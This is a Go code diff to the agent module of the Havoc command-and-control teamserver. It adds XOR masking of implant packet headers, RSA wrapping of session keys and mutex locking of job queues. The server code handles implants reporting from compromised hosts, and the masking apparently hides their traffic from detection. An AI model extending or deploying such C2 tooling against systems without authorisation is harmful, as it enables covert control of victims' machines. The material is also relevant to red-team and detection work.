@@ -3,6 +3,7 @@ package agent
 import (
 	"bytes"
 	"encoding/binary"
+
 	//"encoding/hex"
 	"encoding/json"
 	"errors"
@@ -11,10 +12,10 @@ import (
 	"net"
 	"os"
 	"path/filepath"
+	"reflect"
 	"strconv"
 	"strings"
 	"time"
-	"reflect"
 
 	"Havoc/pkg/common"
 	"Havoc/pkg/common/crypt"
@@ -147,7 +148,7 @@ func BuildPayloadMessage(Jobs []Job, AesKey []byte, AesIv []byte) []byte {
 				} else {
 					binary.LittleEndian.PutUint32(boolean, 0)
 				}
-				
+
 				DataPayload = append(DataPayload, boolean...)
 
 				break
@@ -189,6 +190,24 @@ func ParseHeader(data []byte) (Header, error) {
 	} else {
 		return Header, errors.New("failed to parse package size")
 	}
+
+	// [HVC-003 2026-03-26] Reverse the XOR mask applied by the Demon to outer
+	// header fields (bytes 4-19: magic, agent ID, command ID, request ID).
+	// The Demon derives the mask as SIZE ^ HEADER_MASK_SEED; we reconstruct it
+	// from the SIZE we just parsed and apply the same XOR to undo it.
+	// See TrafficImprovements.md §3.
+	//
+	// [HVC-007 2026-03-28] The Demon sets bit 31 of the wire SIZE field to
+	// signal LZNT1 compression, and then applies HVC-003 masking to the
+	// following 16 bytes using the full SIZE value (bit 31 included) as the
+	// mask base.  We must therefore compute the XOR mask from the raw SIZE
+	// (before stripping bit 31) to match what the Demon computed.
+	Parser.XorMaskNextBytes(Header.Size^int(HeaderMaskSeed), 16)
+
+	// Now safe to extract the compression flag and strip bit 31.
+	// See TrafficImprovements.md §7.
+	Header.Compressed = (Header.Size & 0x80000000) != 0
+	Header.Size &= 0x7FFFFFFF
 
 	if Parser.Length() > 4 {
 		Header.MagicValue = Parser.ParseInt32()
@@ -279,13 +298,13 @@ func RegisterInfoToInstance(Header Header, RegisterInfo map[string]any) *Agent {
 
 	// Updated OS Version handling
 	if val, ok := RegisterInfo["OS Version"]; ok {
-	    // Assuming val is a string representing the OS version, split it by '.' to get the version parts
-	    versionParts := strings.Split(val.(string), ".")
-	    OsVersion := make([]int, len(versionParts))
-	    for i, part := range versionParts {
-		OsVersion[i], _ = strconv.Atoi(part)
-	    }
-	    agent.Info.OSVersion = getWindowsVersionString(OsVersion)
+		// Assuming val is a string representing the OS version, split it by '.' to get the version parts
+		versionParts := strings.Split(val.(string), ".")
+		OsVersion := make([]int, len(versionParts))
+		for i, part := range versionParts {
+			OsVersion[i], _ = strconv.Atoi(part)
+		}
+		agent.Info.OSVersion = getWindowsVersionString(OsVersion)
 	}
 
 	if val, ok := RegisterInfo["OS Build"]; ok {
@@ -295,7 +314,7 @@ func RegisterInfoToInstance(Header Header, RegisterInfo map[string]any) *Agent {
 	if val, ok := RegisterInfo["OS Arch"]; ok {
 		agent.Info.OSArch = val.(string)
 	}
-	
+
 	if val, ok := RegisterInfo["SleepDelay"]; ok {
 		switch v := val.(type) {
 		case float64:
@@ -312,12 +331,10 @@ func RegisterInfoToInstance(Header Header, RegisterInfo map[string]any) *Agent {
 			agent.Info.SleepDelay = 0
 		}
 	}
-	
 
 	agent.Info.FirstCallIn = time.Now().Format("02/01/2006 15:04:05")
-	
+
 	agent.Info.LastCallIn = time.Now().Format("02-01-2006 15:04:05")
-	
 
 	agent.BackgroundCheck = false
 	agent.Active = true
@@ -325,7 +342,13 @@ func RegisterInfoToInstance(Header Header, RegisterInfo map[string]any) *Agent {
 	return agent
 }
 
-func ParseDemonRegisterRequest(AgentID int, Parser *parser.Parser, ExternalIP string) *Agent {
+// ParseDemonRegisterRequest parses the Demon registration packet.
+//
+// [HVC-005 2026-03-28] The rsaDecrypt parameter must be non-nil; it is called
+// with the 256-byte RSA-OAEP-SHA256 ciphertext that wraps the agent's 48-byte
+// AES session key material (32-byte key + 16-byte IV).  The recovered key
+// material is used to decrypt the remainder of the registration body.
+func ParseDemonRegisterRequest(AgentID int, Parser *parser.Parser, ExternalIP string, rsaDecrypt func([]byte) ([]byte, error)) *Agent {
 	//logger.Debug("Response:\n" + hex.Dump(Parser.Buffer()))
 
 	var (
@@ -348,19 +371,17 @@ func ParseDemonRegisterRequest(AgentID int, Parser *parser.Parser, ExternalIP st
 		SleepJitter  int
 		KillDate     int64
 		WorkingHours int32
-		AesKeyEmpty  = make([]byte, 32)
 	)
 
 	/*
-		[ SIZE         ] 4 bytes
-		[ Magic Value  ] 4 bytes
-		[ Agent ID     ] 4 bytes
-		[ COMMAND ID   ] 4 bytes
-		[ Request ID   ] 4 bytes
-		[ AES KEY      ] 32 bytes
-		[ AES IV       ] 16 bytes
+		[ SIZE          ] 4 bytes
+		[ Magic Value   ] 4 bytes
+		[ Agent ID      ] 4 bytes
+		[ COMMAND ID    ] 4 bytes
+		[ Request ID    ] 4 bytes
+		[ RSA CIPHERTEXT] 256 bytes  -- [HVC-005] wraps 32-byte AES key + 16-byte IV
 		AES Encrypted {
-			[ Agent ID     ] 4 bytes <-- this is needed to check if we successfully decrypted the data
+			[ Agent ID     ] 4 bytes <-- used to verify decryption succeeded
 			[ Host Name    ] size + bytes
 			[ User Name    ] size + bytes
 			[ Domain       ] size + bytes
@@ -377,15 +398,27 @@ func ParseDemonRegisterRequest(AgentID int, Parser *parser.Parser, ExternalIP st
 		}
 	*/
 
-	if Parser.Length() >= 32+16 {
+	// [HVC-005] Read 256-byte RSA ciphertext and recover the 48-byte key material.
+	const rsaCiphertextLen = 256
+	if Parser.Length() >= rsaCiphertextLen {
+		rsaCiphertext := Parser.ParseAtLeastBytes(rsaCiphertextLen)
+
+		keyMaterial, err := rsaDecrypt(rsaCiphertext)
+		if err != nil || len(keyMaterial) < 48 {
+			logger.Error("HVC-005: RSA key unwrap failed: " + func() string {
+				if err != nil { return err.Error() }
+				return "short key material"
+			}())
+			return nil
+		}
 
 		var Session = &Agent{
 			Encryption: struct {
 				AESKey []byte
 				AESIv  []byte
 			}{
-				AESKey: Parser.ParseAtLeastBytes(32),
-				AESIv:  Parser.ParseAtLeastBytes(16),
+				AESKey: keyMaterial[0:32],
+				AESIv:  keyMaterial[32:48],
 			},
 
 			Active:     false,
@@ -394,10 +427,7 @@ func ParseDemonRegisterRequest(AgentID int, Parser *parser.Parser, ExternalIP st
 			Info: new(AgentInfo),
 		}
 
-		// check if there is aes key/iv.
-		if bytes.Compare(Session.Encryption.AESKey, AesKeyEmpty) != 0 {
-			Parser.DecryptBuffer(Session.Encryption.AESKey, Session.Encryption.AESIv)
-		}
+		Parser.DecryptBuffer(Session.Encryption.AESKey, Session.Encryption.AESIv)
 
 		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt64, parser.ReadInt32}) {
 			DemonID = Parser.ParseInt32()
@@ -431,8 +461,8 @@ func ParseDemonRegisterRequest(AgentID int, Parser *parser.Parser, ExternalIP st
 				Hostname, Username, DomainName, InternalIP, ExternalIP))
 
 			ProcessName = Parser.ParseUTF16String()
-			ProcessPID  = Parser.ParseInt32()
-			ProcessTID  = Parser.ParseInt32()
+			ProcessPID = Parser.ParseInt32()
+			ProcessTID = Parser.ParseInt32()
 			ProcessPPID = Parser.ParseInt32()
 			ProcessArch = Parser.ParseInt32()
 			Elevated = Parser.ParseInt32()
@@ -528,8 +558,8 @@ func ParseDemonRegisterRequest(AgentID int, Parser *parser.Parser, ExternalIP st
 			process := strings.Split(ProcessName, "\\")
 
 			Session.Info.ProcessName = process[len(process)-1]
-			Session.Info.ProcessPID  = ProcessPID
-			Session.Info.ProcessTID  = ProcessTID
+			Session.Info.ProcessPID = ProcessPID
+			Session.Info.ProcessTID = ProcessTID
 			Session.Info.ProcessPPID = ProcessPPID
 			Session.Info.ProcessPath = ProcessName
 			Session.Info.BaseAddress = BaseAddress
@@ -620,6 +650,9 @@ func (a *Agent) IsKnownRequestID(teamserver TeamServer, RequestID uint32, Comman
 		return true
 	}
 
+	a.JobMtx.Lock()
+	defer a.JobMtx.Unlock()
+
 	for i := range a.Tasks {
 		if a.Tasks[i].RequestID == RequestID {
 			return true
@@ -630,12 +663,17 @@ func (a *Agent) IsKnownRequestID(teamserver TeamServer, RequestID uint32, Comman
 
 // the operator added a new request/command
 func (a *Agent) AddRequest(job Job) []Job {
+	a.JobMtx.Lock()
+	defer a.JobMtx.Unlock()
 	a.Tasks = append(a.Tasks, job)
 	return a.Tasks
 }
 
-// after a request has been completed, we can forget about the RequestID so that it is no longer valid
+// after a request has been completed, we can forget about the RequestID so that it is no longer valid.
 func (a *Agent) RequestCompleted(RequestID uint32) {
+	a.JobMtx.Lock()
+	defer a.JobMtx.Unlock()
+
 	for i := range a.Tasks {
 		if a.Tasks[i].RequestID == RequestID {
 			a.Tasks = append(a.Tasks[:i], a.Tasks[i+1:]...)
@@ -645,93 +683,38 @@ func (a *Agent) RequestCompleted(RequestID uint32) {
 }
 
 func (a *Agent) AddJobToQueue(job Job) []Job {
-	// store the RequestID									
-	a.AddRequest(job)
+	a.JobMtx.Lock()
+	defer a.JobMtx.Unlock()
+
+	// store the RequestID (caller holds a.JobMtx)
+	a.Tasks = append(a.Tasks, job)
+
 	// if it's a pivot agent then add the job to the parent
 	if a.Pivots.Parent != nil {
-		//logger.Debug("Prepare command for pivot demon: " + a.NameID)
+		logger.Debug(fmt.Sprintf("AddJobToQueue: pivot agent %s — routing Command=0x%x through parent %s",
+			a.NameID, job.Command, a.Pivots.Parent.NameID))
 		a.PivotAddJob(job)
 		// if it's a direct agent add the job to the direct agent
 	} else {
+		logger.Debug(fmt.Sprintf("AddJobToQueue: direct agent %s — queuing Command=0x%x (queue_len=%d→%d)",
+			a.NameID, job.Command, len(a.JobQueue), len(a.JobQueue)+1))
 		a.JobQueue = append(a.JobQueue, job)
 	}
 	return a.JobQueue
 }
 
 func (a *Agent) GetQueuedJobs() []Job {
-	var Jobs []Job
-	var JobsSize = 0
-	var NumJobs = 0
+	a.JobMtx.Lock()
+	defer a.JobMtx.Unlock()
 
-	// make sure we return a number of jobs that doesn't exceed DEMON_MAX_RESPONSE_LENGTH
-	for _, job := range a.JobQueue {
-
-		for i := range job.Data {
-
-			switch job.Data[i].(type) {
-			case int:
-				JobsSize += 4
-				break
-
-			case int64:
-				JobsSize += 8
-				break
-
-			case uint64:
-				JobsSize += 8
-				break
-
-			case int32:
-				JobsSize += 4
-				break
-
-			case uint32:
-				JobsSize += 4
-				break
-
-			case int16:
-				JobsSize += 2
-				break
-
-			case uint16:
-				JobsSize += 2
-				break
-
-			case string:
-				JobsSize += 4 + len(job.Data[i].(string))
-				break
-
-			case []byte:
-				JobsSize += 4 + len(job.Data[i].([]byte))
-				break
-
-			case byte:
-				JobsSize += 1
-				break
-
-			case bool:
-				JobsSize += 4
-				break
-
-			default:
-				logger.Error(fmt.Sprintf("Could determine package size, unknown data type: %v", job.Data[i]))
-			}
-		}
-
-		if JobsSize >= DEMON_MAX_RESPONSE_LENGTH {
-			break
-		}
-
-		NumJobs++
+	if len(a.JobQueue) == 0 {
+		return nil
 	}
 
-	// if there is a very large job, send it anyways
-	if len(a.JobQueue) > 0 && NumJobs == 0 {
-		NumJobs = 1
-	}
-
-	// return NumJobs and leave the rest on the JobQueue
-	Jobs, a.JobQueue = a.JobQueue[:NumJobs], a.JobQueue[NumJobs:]
+	// drain all queued jobs at once
+	Jobs := make([]Job, len(a.JobQueue))
+	copy(Jobs, a.JobQueue)
+	a.JobQueue = nil
 
 	return Jobs
 }
@@ -760,12 +743,14 @@ func (a *Agent) PivotAddJob(job Job) {
 		return
 	}
 
+	logger.Debug(fmt.Sprintf("PivotAddJob: building COMMAND_PIVOT wrapper for pivot %s (AgentID=%08x), payload=%d bytes",
+		a.NameID, AgentID, len(Payload)))
+
 	Packer.AddInt32(int32(AgentID))
 	Packer.AddBytes(Payload)
 
-	// add this job to pivot queue.
-	// tho it's not going to be used besides for the task size calculator
-	// which is going to be displayed to the operator.
+	// add this job to pivot queue (display-only copy for the operator UI).
+	// Caller (AddJobToQueue) already holds a.JobMtx.
 	a.JobQueue = append(a.JobQueue, job)
 
 	PivotJob = Job{
@@ -810,7 +795,13 @@ func (a *Agent) PivotAddJob(job Job) {
 		pivots = &pivots.Parent.Pivots
 	}
 
+	// Lock the root parent's mutex to safely append the pivot job.
+	// This is safe: lock order is always child → parent (no circular dependency).
+	pivots.Parent.JobMtx.Lock()
+	logger.Debug(fmt.Sprintf("PivotAddJob: queuing COMMAND_PIVOT job on parent %s (queue_len=%d→%d)",
+		pivots.Parent.NameID, len(pivots.Parent.JobQueue), len(pivots.Parent.JobQueue)+1))
 	pivots.Parent.JobQueue = append(pivots.Parent.JobQueue, PivotJob)
+	pivots.Parent.JobMtx.Unlock()
 }
 
 func (a *Agent) DownloadAdd(FileID int, FilePath string, FileSize int64) error {
@@ -920,7 +911,7 @@ func (a *Agent) PortFwdNew(SocketID, LclAddr, LclPort, FwdAddr, FwdPort int, Tar
 	}
 
 	a.PortFwdsMtx.Lock()
-	
+
 	a.PortFwds = append(a.PortFwds, portfwd)
 
 	a.PortFwdsMtx.Unlock()
@@ -1043,7 +1034,7 @@ func (a *Agent) PortFwdClose(SocketID int) {
 			/* remove the socket from the array */
 			a.PortFwds = append(a.PortFwds[:i], a.PortFwds[i+1:]...)
 
-			break;
+			break
 		}
 
 	}
@@ -1054,12 +1045,12 @@ func (a *Agent) SocksClientAdd(SocketID int32, conn net.Conn, ATYP byte, IpDomai
 
 	var client = new(SocksClient)
 
-	client.SocketID  = SocketID
-	client.Conn      = conn
+	client.SocketID = SocketID
+	client.Conn = conn
 	client.Connected = false
-	client.ATYP      = ATYP
-	client.IpDomain  = IpDomain
-	client.Port      = Port
+	client.ATYP = ATYP
+	client.IpDomain = IpDomain
+	client.Port = Port
 
 	a.SocksCliMtx.Lock()
 
@@ -1095,8 +1086,8 @@ func (a *Agent) SocksClientGet(SocketID int) *SocksClient {
 
 func (a *Agent) SocksClientRead(client *SocksClient) ([]byte, error) {
 	var (
-		data  = make([]byte, 0x10000)
-		read  []byte
+		data = make([]byte, 0x10000)
+		read []byte
 	)
 
 	if client != nil {
@@ -1180,7 +1171,7 @@ func (a *Agent) SocksServerRemove(Addr string) {
 			/* remove the socket from the array */
 			a.SocksSvr = append(a.SocksSvr[:i], a.SocksSvr[i+1:]...)
 
-			break;
+			break
 		}
 
 	}
@@ -1207,6 +1198,10 @@ func (a *Agent) ToMap() map[string]interface{} {
 	delete(Info, "Connection")
 	delete(Info, "SessionDir")
 	delete(Info, "JobQueue")
+	delete(Info, "Tasks")
+	delete(Info, "JobMtx")
+	delete(Info, "FragmentBuffer")
+	delete(Info, "FragmentMtx")
 	delete(Info, "Parent")
 
 	MagicValue = fmt.Sprintf("%08x", a.Info.MagicValue)
